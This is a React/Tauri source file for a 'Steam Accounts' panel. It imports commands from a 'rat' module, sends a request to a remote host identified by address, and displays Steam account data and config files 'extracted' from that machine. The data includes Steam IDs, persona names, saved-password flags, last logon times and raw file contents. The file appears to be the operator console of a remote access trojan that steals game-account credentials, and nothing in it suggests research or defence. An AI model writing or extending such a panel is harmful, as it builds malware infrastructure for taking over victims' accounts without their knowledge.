import React, { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import { listen } from "@tauri-apps/api/event";
import { requestSteamDataCmd } from "../rat/RATCommands";
import {
  SteamDataPayload,
  SteamAccountEntry,
  ExtractedFile,
} from "../../types";
import { IconSteam, IconUser, IconRefresh, IconFileText } from "@tabler/icons-react";

export const SteamAccount: React.FC = () => {
  const { addr } = useParams();
  const [steamAccounts, setSteamAccounts] = useState<SteamAccountEntry[]>([]);
  const [steamFiles, setSteamFiles] = useState<ExtractedFile[]>([]);
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState("Ready");
  const [selectedFile, setSelectedFile] = useState<ExtractedFile | null>(null);

  useEffect(() => {
    let unlistenSteam: (() => void) | null = null;

    const setupListeners = async () => {
      unlistenSteam = await listen("steam_data", (event) => {
        const payload = event.payload as SteamDataPayload;
        if (payload.addr !== addr) return;
        setSteamAccounts(payload.data.accounts);
        setSteamFiles(payload.data.files);
        setStatus("Steam data recovered");
        setLoading(false);
      });
    };

    setupListeners();

    return () => {
      unlistenSteam?.();
    };
  }, [addr]);

  const requestSteamData = async () => {
    if (!addr) return;
    setStatus("Requesting Steam data...");
    setLoading(true);
    try {
      await requestSteamDataCmd(addr);
    } catch (e) {
      console.error(e);
      setStatus("Request failed");
      setLoading(false);
    }
  };

  return (
    <div className="flex flex-col h-screen bg-[#050505] text-gray-200 overflow-hidden font-sans">
      <div className="h-16 shrink-0 bg-[#0a0a0a] border-b border-[#1a1a1a] flex items-center justify-between px-6 shadow-xl z-20">
        <div className="flex items-center gap-4">
          <div className="p-2 bg-accentx/10 rounded-xl border border-accentx/20">
            <IconSteam className="text-accentx" size={24} />
          </div>
          <div>
            <h1 className="text-lg font-black tracking-tighter uppercase italic text-white">
              Steam Accounts
            </h1>
            <p className="text-[10px] font-mono text-gray-500 uppercase tracking-widest leading-none">
              Extracted Steam account data and configuration files
            </p>
          </div>
        </div>

        <div className="flex items-center gap-3">
          <span className="text-xs uppercase tracking-[0.3em] text-gray-500">
            {status}
          </span>
          <button
            onClick={requestSteamData}
            className="rounded-xl bg-[#111] px-4 py-2 text-xs text-white hover:bg-[#222] transition flex items-center gap-2"
            disabled={loading}
          >
            <IconRefresh size={14} /> Refresh
          </button>
        </div>
      </div>

      <div className="flex flex-1 overflow-hidden">
        <div className="w-80 shrink-0 bg-[#080808] border-r border-[#1a1a1a] p-4 space-y-4 overflow-y-auto">
          <div className="rounded-2xl bg-[#0f0f0f] border border-[#1a1a1a] p-4">
            <div className="flex items-center justify-between text-xs uppercase tracking-[0.3em] text-gray-500 mb-3">
              <span>Summary</span>
            </div>
            <div className="space-y-2 text-[11px] text-gray-300">
              <div>Accounts: {steamAccounts.length}</div>
              <div>Config files: {steamFiles.length}</div>
              <div>Status: {loading ? "Loading..." : "Idle"}</div>
            </div>
          </div>

          {steamFiles.length > 0 && (
            <div>
              <h3 className="text-xs uppercase tracking-[0.3em] text-gray-500 mb-2">
                Config Files
              </h3>
              <div className="space-y-1">
                {steamFiles.map((file, index) => (
                  <button
                    key={index}
                    onClick={() => setSelectedFile(file)}
                    className={`w-full text-left rounded-xl px-3 py-2 text-xs transition flex items-center gap-2 ${
                      selectedFile?.path === file.path
                        ? "bg-accentx/20 text-white"
                        : "bg-[#111] text-gray-400 hover:bg-[#1a1a1a]"
                    }`}
                  >
                    <IconFileText size={14} />
                    <span className="truncate">{file.path.split("\\").pop()}</span>
                  </button>
                ))}
              </div>
            </div>
          )}
        </div>

        <div className="flex-1 p-6 overflow-y-auto bg-[#050505]">
          <div className="grid grid-cols-1 gap-4 lg:grid-cols-2">
            <section className="rounded-3xl border border-[#1a1a1a] bg-[#0c0c0c] p-4">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-sm font-bold uppercase tracking-[0.2em] text-gray-400">
                  Accounts
                </h2>
                <span className="text-xs text-gray-500">
                  {steamAccounts.length}
                </span>
              </div>
              {steamAccounts.length === 0 ? (
                <p className="text-sm text-gray-500">
                  No Steam account records available.
                </p>
              ) : (
                <div className="space-y-3">
                  {steamAccounts.map((account, index) => (
                    <div
                      key={index}
                      className="rounded-2xl border border-[#1a1a1a] p-4 bg-[#111]"
                    >
                      <div className="flex items-center gap-3 mb-3">
                        <div className="p-2 bg-[#1a1a1a] rounded-lg">
                          <IconUser size={18} className="text-accentx" />
                        </div>
                        <div>
                          <div className="text-sm font-semibold text-white">
                            {account.account_name || account.persona_name || account.steam_id}
                          </div>
                          <div className="text-xs text-gray-400">
                            Steam ID: {account.steam_id}
                          </div>
                        </div>
                      </div>
                      <div className="space-y-1 text-xs text-gray-400">
                        <div>Persona: {account.persona_name}</div>
                        <div>Remember password: {account.remember_password}</div>
                        <div>Last logon: {account.last_logon}</div>
                      </div>
                      {account.details && (
                        <details className="mt-3">
                          <summary className="text-xs text-gray-500 cursor-pointer hover:text-gray-300 transition">
                            Raw details
                          </summary>
                          <pre className="mt-2 text-[10px] text-gray-400 bg-[#0a0a0a] rounded-xl p-3 overflow-x-auto whitespace-pre-wrap break-all max-h-40">
                            {account.details}
                          </pre>
                        </details>
                      )}
                    </div>
                  ))}
                </div>
              )}
            </section>

            <section className="rounded-3xl border border-[#1a1a1a] bg-[#0c0c0c] p-4">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-sm font-bold uppercase tracking-[0.2em] text-gray-400">
                  {selectedFile
                    ? selectedFile.path.split("\\").pop()
                    : "Config File Viewer"}
                </h2>
              </div>
              {selectedFile ? (
                <pre className="text-xs text-gray-300 bg-[#0a0a0a] rounded-xl p-4 overflow-x-auto whitespace-pre-wrap break-all max-h-[500px] font-mono">
                  {selectedFile.contents}
                </pre>
              ) : (
                <p className="text-sm text-gray-500">
                  Select a config file from the sidebar to view its contents.
                </p>
              )}
            </section>
          </div>
        </div>
      </div>
    </div>
  );
};
